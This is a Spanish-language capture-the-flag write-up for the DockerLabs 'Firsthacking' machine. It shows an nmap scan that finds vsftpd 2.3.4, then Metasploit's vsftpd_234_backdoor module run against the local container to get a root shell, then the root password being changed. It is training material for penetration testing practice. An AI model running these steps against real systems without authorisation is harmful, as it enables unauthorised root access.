# Write-up Firsthacking
> Maquina de El pingüino de Mario-Fecha de creación: 14/06/2024

> Fecha de creación del Write-up 27/01/2025

## Índice
1. [Descripción](#Descripción)
2. [Herrmientas](#Herrmainetas)
3. [Instalación](#Instalación)
4. [Proceso_de_explotación](#Proceso_de_explotación)
5. [Webgrafia](#Webgrafia)

## Descripción

Durante todo el proceso del **Write-up** se demostrara con las diferentes herramientas como se puede llegar a entrar al modo **root** y poder dar por acabada la prueba de intrusión

## Herramientas

| Herramientas     | Descripción                       | Versión    |
|------------------|-----------------------------------|-----------|
|**Nmap**| Permite descubrir Dispositivos en la red,servicios,puertos...           | ✅ Listo  |
| **Metasploit**   | Permite a traves de diferentes componentes de la herramienta buscar exploits para poder aprovecharse de las vulnerabilidades que existan      | 🔄 En progreso |
| **Ftp**| Enviar alertas al usuario        | ❌ Pendiente |

## Instalación

Antes de empezar deberemos de desplegar la maquina vulnerable para que este disponible durante todo el proceso de intrusión
```bash

#Le damos permisos de ejecución

┌──(alema㉿alema)-[~/Escritorio/dockerlabs/Muy facil/firsthacking]
└─$ sudo chmod +x auto_deploy.sh

 #Ejecutamos el .sh sobre el comprimido de la maquina
                                                                           
┌──(alema㉿alema)-[~/Escritorio/dockerlabs/Muy facil/firsthacking]
└─$ sudo ./auto_deploy.sh firsthacking.tar 

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla

```
## Proceso_de_explotación

Ahora que la maquina ya esta disponible, pasaremos a comprobar que servicios y puertos tiene abiertos a la red.

```bash
#Deberemos de utilizar la herramienta Nmap con el parametro -A para que compruebe puertos,servicios,scripts...

──(alema㉿alema)-[~]
└─$ sudo nmap -A 172.17.0.2 >Prueba_de_IP

#Al  ver el resultado del Nmap podemos ver que tiene el puerto 21 con el servicio de vsftpd y version de 2.3.4
                                                                         
┌──(alema㉿alema)-[~]
└─$ cat Prueba_de_IP 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-27 23:21 CET
Nmap scan report for 172.17.0.2
Host is up (0.000050s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
MAC Address: 02:42:AC:11:00:02 (Unknown)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Unix

TRACEROUTE
HOP RTT     ADDRESS
1   0.05 ms 172.17.0.2

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.73 seconds

```
Ahora que sabemos que tiene este servicio con la versión 2.3.4 buscaremos si existe algun tipo de vulnerabilidad para poder entrar por este puerto.Al buscar en google, dentro de la base de datos de [Exploit-DB](https://www.exploit-db.com/)



![image](https://github.com/user-attachments/assets/6a05a67c-183d-46d9-863e-2641f088831c)


Como se observa podemos utilizar la herramienta de **Metasploit** desde kali para entrar por el vsftpd

```bash

#Ejecutamos la msfconsole desde la terminal 

┌──(alema㉿alema)-[~]
└─$ sudo msfconsole 
Metasploit tip: Search can apply complex filters such as search cve:2009 
type:exploit, see all the filters with help search
                                                  

         .                                         .
 .

      dBBBBBBb  dBBBP dBBBBBBP dBBBBBb  .                       o
       '   dB'                     BBP
    dB'dB'dB' dBBP     dBP     dBP BB
   dB'dB'dB' dBP      dBP     dBP  BB
  dB'dB'dB' dBBBBP   dBP     dBBBBBBB

                                   dBBBBBP  dBBBBBb  dBP    dBBBBP dBP dBBBBBBP
          .                  .                  dB' dBP    dB'.BP
                             |       dBP    dBBBB' dBP    dB'.BP dBP    dBP
                           --o--    dBP    dBP    dBP    dB'.BP dBP    dBP
                             |     dBBBBP dBP    dBBBBP dBBBBP dBP    dBP

                                                                    .
                .
        o                  To boldly go where no                                                                                                                                                                                            
                            shell has gone before                                                                                                                                                                                           
                                                                                                                                                                                                                                            

       =[ metasploit v6.4.34-dev                          ]
+ -- --=[ 2461 exploits - 1267 auxiliary - 431 post       ]
+ -- --=[ 1471 payloads - 49 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

#Buscamos los exploits del servicio vsftpd,como se puede observar hay uno con la versión 2.3.4

msf6 > search vsftpd

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  auxiliary/dos/ftp/vsftpd_232          2011-02-03       normal     Yes    VSFTPD 2.3.2 Denial of Service
   1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution


Interact with a module by name or index. For example info 1, use 1 or use exploit/unix/ftp/vsftpd_234_backdoor

#Usamos el exploit 

msf6 > use exploit/unix/ftp/vsftpd_234_backdoor 
[*] No payload configured, defaulting to cmd/unix/interact
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > info

       Name: VSFTPD v2.3.4 Backdoor Command Execution
     Module: exploit/unix/ftp/vsftpd_234_backdoor
   Platform: Unix
       Arch: cmd
 Privileged: Yes
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2011-07-03

Provided by:
  hdm <x@hdm.io>
  MC <mc@metasploit.com>

Available targets:
      Id  Name
      --  ----
  =>  0   Automatic

Check supported:
  No

#Necesidades del exploit

Basic options:
  Name    Current Setting  Required  Description
  ----    ---------------  --------  -----------
  RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
  RPORT   21               yes       The target port (TCP)

Payload information:
  Space: 2000
  Avoid: 0 characters

Description:
  This module exploits a malicious backdoor that was added to the       VSFTPD download
  archive. This backdoor was introduced into the vsftpd-2.3.4.tar.gz archive between
  June 30th 2011 and July 1st 2011 according to the most recent information
  available. This backdoor was removed on July 3rd 2011.

References:
  OSVDB (73573)
  http://pastebin.com/AetT9sS5
  http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html


View the full module info with the info -d command.

#Añadimos la Ip de la maquina vulnerable

msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 172.17.0.2
RHOSTS => 172.17.0.2

#revisamos los cambios 

msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options
                                                                                                                                                                                                                                            
Module options (exploit/unix/ftp/vsftpd_234_backdoor):                                                                                                                                                                                      
                                                                                                                                                                                                                                            
   Name    Current Setting  Required  Description                                                                                                                                                                                           
   ----    ---------------  --------  -----------                                                                                                                                                                                           
   RHOSTS  172.17.0.2       yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html                                                                                                
   RPORT   21               yes       The target port (TCP)                                                                                                                                                                                 
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
Exploit target:                                                                                                                                                                                                                             
                                                                                                                                                                                                                                            
   Id  Name                                                                                                                                                                                                                                 
   --  ----                                                                                                                                                                                                                                 
   0   Automatic                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
View the full module info with the info, or info -d command.   
```
Una vez esta todo configurado pasaremos a ejecutar el exploit

```bash

#Arrancamos el exploit

msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run                                                                                                                                                                                            
                                                                                                                                                                                                                                            
[*] 172.17.0.2:21 - Banner: 220 (vsFTPd 2.3.4)                                                                                                                                                                                              
[*] 172.17.0.2:21 - USER: 331 Please specify the password.                                                                                                                                                                                  
[+] 172.17.0.2:21 - Backdoor service has been spawned, handling...                                                                                                                                                                          
[+] 172.17.0.2:21 - UID: uid=0(root) gid=0(root) groups=0(root)                                                                                                                                                                             
[*] Found shell.                                                                                                                                                                    
[*] Command shell session 1 opened (172.17.0.1:38279 -> 172.17.0.2:6200) at 2025-01-27 23:44:52 +0100

#Tenemos la shell capturada                                                                                                                                     
ls
AUDIT
BENCHMARKS
BUGS
COPYING
COPYRIGHT
Changelog
EXAMPLE
FAQ
INSTALL
LICENSE
Makefile
README
README.security
README.ssl
REFS
REWARD
RedHat
SECURITY
SIZE
SPEED
TODO
(Entre otros directorios)   
```
Ahora que estamos dentro de la maquina podriamos comprobar si estamos como usuario administrador

```bash

#Comprobamos la ruta donde nos encontramos
pwd
/root/vsftpd-2.3.4

#De forma optativa podriamos cambiar si queremos la contraseña de root

passwd
New password: alema
Retype new password: alema
passwd: password updated successfully
  
```
Con todo esto se da por acabado el objetivo principal de la máquina.





